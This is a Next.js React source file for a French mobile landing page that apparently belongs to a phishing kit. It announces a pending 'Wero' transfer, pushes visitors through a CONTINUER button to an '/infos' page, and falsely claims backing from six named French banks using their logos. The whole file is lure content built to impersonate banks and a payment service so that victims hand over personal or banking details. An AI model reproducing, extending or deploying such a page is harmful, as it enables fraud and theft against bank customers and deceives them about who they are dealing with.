'use client';

import React, { useState } from 'react';
import Link from 'next/link';

export default function HomePage() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  return (
    <div className="min-h-[100dvh] w-full bg-white text-slate-900 font-sans flex flex-col justify-between overflow-x-hidden select-none">
      
      {/* En-tête avec lien image logo à gauche */}
      <header className="w-full px-5 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20 shrink-0">
        <Link href="/" className="flex items-center hover:opacity-80 transition-opacity">
          <img 
            src="/flavicon.ico" 
            alt="We" 
            className="h-8 w-auto object-contain"
          />
        </Link>

        {/* Bouton Menu Burger */}
        <button
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          aria-label="Menu"
          className="p-2 text-slate-900 focus:outline-none"
        >
          <div className="w-5 h-3.5 flex flex-col justify-between">
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
          </div>
        </button>
      </header>

      {/* Menu Déroulant Mobile */}
      {isMenuOpen && (
        <div className="absolute top-[65px] left-0 w-full bg-white/98 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30 animate-in fade-in slide-in-from-top-2 duration-200">
          <nav className="flex flex-col gap-2 font-medium text-slate-700">
            <Link 
              href="/" 
              className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold"
              onClick={() => setIsMenuOpen(false)}
            >
              Accueil
            </Link>
          </nav>
        </div>
      )}

      {/* Contenu Principal */}
      <main className="flex-1 px-6 py-6 max-w-md mx-auto w-full flex flex-col items-center justify-around text-center my-auto">
        
        {/* Titre de la page */}
        <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight">
          Instant Sécurité
        </h1>

        {/* Coche SVG Animée en Boucle Infinie */}
        <div className="w-24 h-24 my-2 flex items-center justify-center relative">
          <svg className="w-24 h-24 text-[#22C55E]" viewBox="0 0 52 52" fill="none">
            <circle
              cx="26"
              cy="26"
              r="23"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              className="animate-[drawCircle_3.5s_ease-in-out_infinite]"
              strokeDasharray="150"
              strokeDashoffset="150"
            />
            <path
              d="M16 26l6 6 14-14"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="animate-[drawCheck_3.5s_ease-in-out_infinite]"
              strokeDasharray="40"
              strokeDashoffset="40"
            />
          </svg>
        </div>

        {/* Textes de statut */}
        <div className="space-y-3">
          <h2 className="text-base sm:text-lg font-black text-slate-900 uppercase tracking-tight leading-snug max-w-[280px] mx-auto">
            VOUS AVEZ UN VIREMENT WERO EN ATTENTE
          </h2>

          <p className="text-xs sm:text-sm text-slate-500 font-medium max-w-[270px] mx-auto leading-relaxed">
            Pour le recevoir directement sur le compte de mon choix.
          </p>
        </div>

        {/* Bouton CONTINUER */}
        <div className="w-full pt-4">
          <Link
            href="/infos"
            className="w-full py-4 bg-[#FFE800] hover:bg-[#ebd300] active:scale-[0.98] text-black font-black text-sm tracking-wider rounded-2xl shadow-sm transition-all text-center block uppercase"
          >
            CONTINUER
          </Link>
        </div>

      </main>

      {/* Footer Partenaires */}
      <footer className="w-full px-5 py-5 border-t border-slate-100 bg-slate-50/50 text-center shrink-0">
        <p className="text-xs font-medium text-slate-500 mb-3.5">
          Ce service vous est proposé par :
        </p>

        <div className="flex items-center justify-center gap-3.5 flex-wrap">
          <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-4 object-contain" />
          <img src="/Banquepopulaire_logo.svg.webp" alt="Banque Populaire" className="h-4 object-contain" />
          <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-4 object-contain" />
          <img src="/12895685.png" alt="Caisse d'Épargne" className="h-4 object-contain" />
          <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-4 object-contain" />
          <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-4 object-contain" />
        </div>
      </footer>

      {/* Keyframes de l'animation SVG */}
      <style jsx global>{`
        @keyframes drawCircle {
          0% {
            stroke-dashoffset: 150;
            transform: rotate(-90deg);
            transform-origin: center;
            opacity: 0.2;
          }
          30% {
            stroke-dashoffset: 0;
            transform: rotate(0deg);
            transform-origin: center;
            opacity: 1;
          }
          80% {
            stroke-dashoffset: 0;
            opacity: 1;
          }
          95%, 100% {
            stroke-dashoffset: 0;
            opacity: 0;
          }
        }

        @keyframes drawCheck {
          0%, 25% {
            stroke-dashoffset: 40;
            opacity: 0;
          }
          45% {
            stroke-dashoffset: 0;
            opacity: 1;
          }
          80% {
            stroke-dashoffset: 0;
            opacity: 1;
          }
          95%, 100% {
            stroke-dashoffset: 0;
            opacity: 0;
          }
        }
      `}</style>

    </div>
  );
}
